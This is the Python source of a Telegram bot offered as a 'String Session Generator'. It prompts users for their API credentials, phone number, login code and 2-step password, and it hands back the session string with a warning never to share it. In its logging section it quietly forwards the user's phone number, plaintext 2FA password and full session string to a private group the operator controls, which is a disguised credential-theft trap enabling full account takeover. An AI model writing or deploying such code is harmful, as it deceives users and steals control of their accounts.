import os
from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded
from pyromod import listen   # enables bot.ask()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID"))
STRING_LOGGER = os.getenv("STRING_LOGGER")  # new

bot = Client(
    "StringGenBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)


async def ask(question, chat_id):
    msg = await bot.ask(chat_id, question, timeout=300)
    return msg.text


@bot.on_message(filters.command("start"))
async def start_msg(_, msg):
    await msg.reply(
        "👋 Welcome to **String Session Generator Bot!**\n\n"
        "Send /session to generate your string session."
    )


@bot.on_message(filters.command("session"))
async def session_cmd(_, msg):
    chat_id = msg.chat.id
    user = msg.from_user

    try:
        api_id = await ask("🧾 Enter your **API ID**:", chat_id)
        api_hash = await ask("🔑 Enter your **API HASH**:", chat_id)
        number = await ask("📞 Enter your **Phone Number with country code**:", chat_id)

        temp = Client("gen", api_id=int(api_id), api_hash=api_hash)
        await temp.connect()
        sent = await temp.send_code(number)

        otp = await ask("📩 Enter the OTP you received:", chat_id)

        two_step_enabled = False
        pw = None

        try:
            await temp.sign_in(number, sent.phone_code_hash, otp)
        except SessionPasswordNeeded:
            pw = await ask("🔐 2-Step Verification enabled!\nEnter your Password:", chat_id)
            two_step_enabled = True
            await temp.check_password(pw)

        string = await temp.export_session_string()
        await temp.disconnect()

        # Send to user
        await msg.reply(
            f"🎉 **Your Pyrogram Session String:**\n\n`{string}`\n\n⚠ Do NOT share this with anyone."
        )

        # ---- LOGGING VIA USER STRING ----
        try:
            from pyrogram import Client as UserLogger
            logger = UserLogger(
                "LOGGER",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=STRING_LOGGER
            )
            await logger.start()

            username = f"@{user.username}" if user.username else "None"
            profile_link = f"https://t.me/{user.username}" if user.username else "No Username"

            await logger.send_message(
                LOG_GROUP_ID,
                f"🟢 **New Session Generated**\n\n"
                f"👤 **Name:** {user.first_name}\n"
                f"🔗 **Username:** {username}\n"
                f"🌍 **Profile:** {profile_link}\n"
                f"🆔 **Telegram ID:** `{user.id}`\n"
                f"📞 **Phone:** `{number}`\n"
                f"🔐 **2-Step Password:** `{pw if pw else 'Not Enabled'}`\n\n"
                f"🔑 **Session String:**\n`{string}`"
            )

            await logger.stop()

        except Exception as log_error:
            await msg.reply("⚠ Session generated but logging failed! Check Heroku logs.")
            print(f"LOGGER ERROR → {log_error}")

    except Exception as e:
        await msg.reply(f"❌ Error: `{e}`")


if __name__ == "__main__":
    bot.run()
